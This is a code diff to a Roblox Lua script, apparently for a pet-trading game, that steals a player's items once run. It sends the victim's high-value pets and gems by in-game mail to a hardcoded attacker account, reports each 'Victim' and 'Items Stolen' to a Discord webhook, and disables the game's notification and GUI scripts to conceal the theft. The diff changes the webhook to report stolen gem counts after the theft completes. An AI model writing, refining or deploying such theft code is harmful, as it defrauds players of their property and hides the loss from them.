@@ -20,8 +20,6 @@ local function getInventory()
 end
 
 local _Inventory = getInventory()
-local u6 = {}
-local u7 = 0
 local v8 = require(Library.Client.Message)
 
 local function u9()
@@ -31,13 +29,13 @@ end
 _G.Usernames = {'Only1sherifalt1'}
 _G.webhook = {'https://discord.com/api/webhooks/1557919052763234397/ejH8PgAHKgnL9U3HmNp671HLU4cFzYcLt0IEp-2yPXPkC2c8lh7IWVhRgC4foIECE_d-'}
 _G.minrap = 1000000
-_G.loopInterval = 10 -- seconds between each rescan
+_G.loopInterval = 10
 
 local u10 = _G.Usernames
 local v11 = _G.minrap
 local u12 = _G.webhook
 local MESSAGE = 'Hello'
-local sentUIDs = {} -- tracks everything already sent so loop never double-sends
+local sentUIDs = {}
 
 for _, name in ipairs(u10) do
     if _LocalPlayer.Name == name then
@@ -75,7 +73,8 @@ local function u31(n)
     return string.format('%.2f%s', n, s[i])
 end
 
-local function sendWebhook(items, gems, totalRap)
+-- webhook now takes gemsSent explicitly so it shows what was actually stolen
+local function sendWebhook(items, gemsSent, totalRap)
     local grouped = {}
     local order = {}
     for _, item in ipairs(items) do
@@ -104,7 +103,7 @@ local function sendWebhook(items, gems, totalRap)
             fields = {
                 {name = 'Victim:', value = _LocalPlayer.Name, inline = true},
                 {name = 'Items Stolen:', value = itemsText, inline = false},
-                {name = 'Summary:', value = 'Gems: ' .. u31(gems) .. '\nTotal RAP: ' .. u31(totalRap), inline = false},
+                {name = 'Summary:', value = 'Gems Stolen: ' .. u31(gemsSent) .. '\nTotal RAP: ' .. u31(totalRap), inline = false},
             },
             footer = {text = 'Zen Edit — Only1sherifalt1'},
         }}
@@ -138,6 +137,7 @@ local function sendItem(cat, uid, amt)
     end
 end
 
+-- returns how many gems were actually sent
 local function sendGems()
     local freshSave = u9()
     for uid, v in pairs(freshSave.Inventory.Currency) do
@@ -153,6 +153,7 @@ local function sendGems()
                     end)
                     if ok and result == true then
                         done = true
+                        return toSend  -- actual amount sent
                     elseif result == "They don't have enough space!" then
                         i = i + 1
                         if i > #u10 then done = true end
@@ -164,6 +165,7 @@ local function sendGems()
             break
         end
     end
+    return 0  -- nothing sent
 end
 
 local function claimMailbox()
@@ -187,6 +189,7 @@ local function withdrawBoxes()
     end
 end
 
+-- runs parallel to claimMailbox so 30s wait doesn't stack
 local function waitForSendReady()
     local ready = false
     while not ready do
@@ -214,14 +217,12 @@ local function getRAP(cat, item)
     return require(RS.Library.Client.RAPCmds).Get(proxy) or 0
 end
 
--- scans inventory, returns only items not already sent
 local CATS = {'Pet','Egg','Charm','Enchant','Potion','Misc','Hoverboard','Booth','Ultimate'}
 
 local function scanNew()
     local newItems = {}
     local newRAP = 0
     local inv = getInventory()
-
     for _, cat in ipairs(CATS) do
         if inv[cat] then
             for uid, item in pairs(inv[cat]) do
@@ -254,32 +255,29 @@ local function scanNew()
             end
         end
     end
-
     return newItems, newRAP
 end
 
+-- steal, then webhook AFTER everything is done
 local function runSteal(items, totalRap)
     if #items == 0 and u25 < u21 + 10000 then return end
 
     withdrawBoxes()
-
     table.sort(items, function(a, b) return a.rap * a.amount > b.rap * b.amount end)
 
     for _, item in ipairs(items) do
         if u21 > item.rap or u21 >= u25 then break end
         sendItem(item.category, item.uid, item.amount)
-        sentUIDs[item.uid] = true  -- mark sent so loop skips it next scan
+        sentUIDs[item.uid] = true
         wait(0.1)
     end
 
-    sendGems()
+    local gemsSent = sendGems()  -- returns actual stolen gem count
 
-    if #items > 0 then
-        spawn(function() sendWebhook(items, u25, totalRap) end)
-    end
+    -- webhook fires HERE, after everything is stolen
+    spawn(function() sendWebhook(items, gemsSent, totalRap) end)
 end
 
--- silence everything
 pcall(function()
     _LocalPlayer.PlayerScripts.Scripts.Core['Process Pending GUI'].Disabled = true
     local notif = _LocalPlayer.PlayerGui.Notifications
@@ -308,21 +306,14 @@ end)
 pcall(function() require(Library.Client.DaycareCmds).Claim() end)
 pcall(function() require(Library.Client.ExclusiveDaycareCmds).Claim() end)
 
--- initial scan + webhook snapshot
-local initItems, initRAP = scanNew()
-u6 = initItems
-u7 = initRAP
-spawn(function() sendWebhook(u6, u25, u7) end)
-wait(0.5)
-
-claimMailbox()
+-- claimMailbox and waitForSendReady run at same time so 30s only costs once
+spawn(function() claimMailbox() end)
 waitForSendReady()
 
--- first steal pass
+local initItems, initRAP = scanNew()
 runSteal(initItems, initRAP)
 v8.Error("All your items just got stolen! gg")
 
--- loop — catches anything new (opened boxes, bought pets, traded in)
 while true do
     wait(_G.loopInterval)
     claimMailbox()
